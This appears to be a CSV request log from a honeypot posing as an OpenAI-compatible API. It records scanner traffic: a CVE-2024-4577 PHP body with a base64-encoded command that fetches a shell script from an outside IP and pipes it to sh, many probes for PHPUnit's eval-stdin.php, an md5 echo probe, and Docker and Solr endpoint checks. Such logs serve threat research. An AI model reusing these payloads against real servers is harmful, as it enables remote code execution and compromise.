request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
4c56399c-cd7f-46d7-8554-23d1cd507e15,2026-03-26T16:44:53.933507+00:00,anon_0d4f90a0,POST,/,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
df8b54c6-a06a-4b18-81f6-0e91c023060e,2026-03-26T16:44:54.879367+00:00,anon_0d4f90a0,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fcd98c07-a128-46cb-a8f5-cf64a1f2a46a,2026-03-26T16:44:56.530949+00:00,anon_0d4f90a0,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7dd96e79-d82a-4fa4-8021-b602863546b0,2026-03-26T16:44:57.515893+00:00,anon_0d4f90a0,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c3c43c87-9c09-4e30-8c64-6aee6757f84a,2026-03-26T16:44:58.619598+00:00,anon_0d4f90a0,GET,/vendor/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
325b6be4-fc1b-427a-a2c0-e22bd07f052b,2026-03-26T16:44:59.797960+00:00,anon_0d4f90a0,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d905c1a4-7324-45cc-b889-e23d8e7e19b7,2026-03-26T16:45:00.876117+00:00,anon_0d4f90a0,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
74406f2a-ddf2-4a21-a656-0d2cca1af6be,2026-03-26T16:45:02.001930+00:00,anon_0d4f90a0,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
959b27bd-1d95-404a-bd32-e966ca051512,2026-03-26T16:45:03.014176+00:00,anon_0d4f90a0,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a2106420-7f9c-400c-a9f3-3a809d6361ad,2026-03-26T16:45:04.065369+00:00,anon_0d4f90a0,GET,/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2e0c5941-4c93-4905-9e99-70ecfa32de08,2026-03-26T16:45:05.203815+00:00,anon_0d4f90a0,GET,/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
246f482e-60e9-4e05-a2fa-ef0a7ecf25e2,2026-03-26T16:45:06.269829+00:00,anon_0d4f90a0,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3527058a-495e-4e8c-bc69-c0a25f2bd738,2026-03-26T16:45:07.349779+00:00,anon_0d4f90a0,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9b274fb6-8ed6-4163-b382-811908d71eb0,2026-03-26T16:45:08.442272+00:00,anon_0d4f90a0,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1880d002-dcaf-4b0a-82d2-d10638d773d3,2026-03-26T16:45:09.573992+00:00,anon_0d4f90a0,GET,/lib/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f0597961-f9b0-4ed3-9913-b504e55887fe,2026-03-26T16:45:10.754765+00:00,anon_0d4f90a0,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c8da6aea-1357-426b-bc53-18a576ecfa08,2026-03-26T16:45:11.904406+00:00,anon_0d4f90a0,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
623b4176-d466-4483-b0c5-12a4dc720fc8,2026-03-26T16:45:12.977648+00:00,anon_0d4f90a0,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
11240afc-498c-4ec0-a000-d0d6cf32a680,2026-03-26T16:45:13.903770+00:00,anon_0d4f90a0,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d8d5c2da-5a49-44b3-baa2-8a6dec4fbeac,2026-03-26T16:45:14.984432+00:00,anon_0d4f90a0,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bae9f308-b9ee-4223-b03a-d5621b42f269,2026-03-26T16:45:15.982035+00:00,anon_0d4f90a0,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
61b64fcc-c33a-4dbc-aadd-18d2077bdc46,2026-03-26T16:45:17.125906+00:00,anon_0d4f90a0,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
53542a5c-e820-4a63-bec4-faec8bb79dad,2026-03-26T16:45:18.355292+00:00,anon_0d4f90a0,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3a230995-3830-4484-9765-fcdf53debff4,2026-03-26T16:45:19.477823+00:00,anon_0d4f90a0,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0102568c-4f88-492f-9d0a-1b97bba2b77c,2026-03-26T16:45:20.638228+00:00,anon_0d4f90a0,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d7d65509-1efd-4b21-9073-8ef8e022e89a,2026-03-26T16:45:21.802866+00:00,anon_0d4f90a0,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
862e13e7-77aa-4a1f-bf6b-aab812d8af54,2026-03-26T16:45:22.850692+00:00,anon_0d4f90a0,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fb1fe530-909d-45cb-9e47-ef441559c2d8,2026-03-26T16:45:24.008176+00:00,anon_0d4f90a0,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4562db93-408c-472b-ab5b-79eec2d08d23,2026-03-26T16:45:25.158405+00:00,anon_0d4f90a0,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
cf9bfdc4-e459-4668-9bf2-5352b3839cc2,2026-03-26T16:45:26.315927+00:00,anon_0d4f90a0,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
86e8ca26-4c67-4a75-acbb-8c758527105e,2026-03-26T16:45:27.345807+00:00,anon_0d4f90a0,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d028b443-6ab9-4915-b7ca-96e5b1bff265,2026-03-26T16:45:28.547785+00:00,anon_0d4f90a0,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
46b9ade0-84dc-4452-bc94-08f040f2702f,2026-03-26T16:45:29.713835+00:00,anon_0d4f90a0,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c2cf6ced-16bc-4566-9479-92241a7c3715,2026-03-26T16:45:30.788585+00:00,anon_0d4f90a0,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
85d0d097-2ea8-4200-9beb-184269eb1a51,2026-03-26T16:45:31.875706+00:00,anon_0d4f90a0,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6b70c512-67f2-42e5-a9a7-4b7c0a96aa1e,2026-03-26T16:45:33.110114+00:00,anon_0d4f90a0,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5bab9a1d-2195-4c14-82d2-616e38efc011,2026-03-26T16:45:34.437341+00:00,anon_0d4f90a0,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0cf89494-d713-4606-88e7-087017e2d87d,2026-03-26T16:45:35.652591+00:00,anon_0d4f90a0,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0d211900-bccf-42c6-bdc2-0c00a928dc28,2026-03-26T16:45:36.798359+00:00,anon_0d4f90a0,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7422bd15-5aa0-4106-a77a-5a305d1840ed,2026-03-26T16:45:37.992493+00:00,anon_0d4f90a0,GET,/public/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a96f3166-7e92-4f1e-aef7-6c5d11b7b8ba,2026-03-26T16:45:39.154773+00:00,anon_0d4f90a0,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c606d76a-0867-4c54-bd50-fbd5ee77e73b,2026-03-26T16:45:40.293808+00:00,anon_0d4f90a0,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ea598da4-2085-4183-a9db-5df3b0dbeea3,2026-03-26T16:45:41.390036+00:00,anon_0d4f90a0,GET,/containers/json,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5bef3918-6087-4774-b8e6-2b5940a1e1e0,2026-03-26T16:54:13.766704+00:00,anon_02e2f139,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,19,118,1,,"<?=md5(""phpunit"")?>","<?=md5(""phpunit"")?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",1,
be180c81-36c3-4430-83d0-a3e8e92c6ce3,2026-03-26T16:58:12.911212+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
0e6d1f3c-99a3-4801-96ea-153ec27de988,2026-03-26T17:03:20.086657+00:00,anon_02e2f139,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",2,
a346354f-b398-43d9-b75a-fd9071f878a7,2026-03-26T17:20:58.222744+00:00,anon_02e2f139,GET,/solr/admin/info/system,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",1,
47fec772-084f-4d40-acaf-dd18cd502c55,2026-03-26T17:28:41.390493+00:00,anon_f50d5982,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
